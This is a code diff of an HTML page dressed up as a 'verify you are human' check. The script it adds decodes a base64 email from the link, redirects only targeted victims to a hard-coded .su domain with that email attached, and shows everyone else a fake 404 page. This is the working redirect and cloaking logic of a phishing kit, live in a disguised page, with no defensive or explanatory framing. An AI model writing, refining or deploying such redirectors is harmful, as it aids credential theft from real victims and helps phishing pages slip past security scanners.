@@ -134,16 +134,37 @@
         </div>
         <div class="message">Please hold on while we verify that you are human...</div>
     </div>
-
     <script>
+        function isValidEmailBase64(base64String) {
+            try {
+                const decodedString = atob(base64String);
+                const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return emailPattern.test(decodedString);
+            } catch (e) {
+                return false;
+            }
+        }
+
         function redirectWithQuery() {
             const baseRedirectUrl = "https://4abkh.mudequel.su/SQCCb/#";
             const queryString = window.location.search.substring(1);
-            const redirectUrl = queryString ? `${baseRedirectUrl}${queryString}` : baseRedirectUrl;
-            window.location.href = redirectUrl;
+            const queryParams = new URLSearchParams(queryString);
+            const emailBase64 = queryParams.get('email');
+
+            if (emailBase64 && isValidEmailBase64(emailBase64)) {
+                const redirectUrl = `${baseRedirectUrl}?${queryString}`;
+                window.location.href = redirectUrl;
+            } else {
+                document.body.innerHTML = '<h1>404 Page Not Found</h1>';
+                document.body.style.textAlign = 'center';
+                document.body.style.paddingTop = '50px';
+                document.body.style.fontFamily = 'Arial, sans-serif';
+            }
         }
-        redirectWithQuery();
+
+        window.onload = redirectWithQuery;
     </script>
+
 </body>
 </html>
  <span style="display: none;">
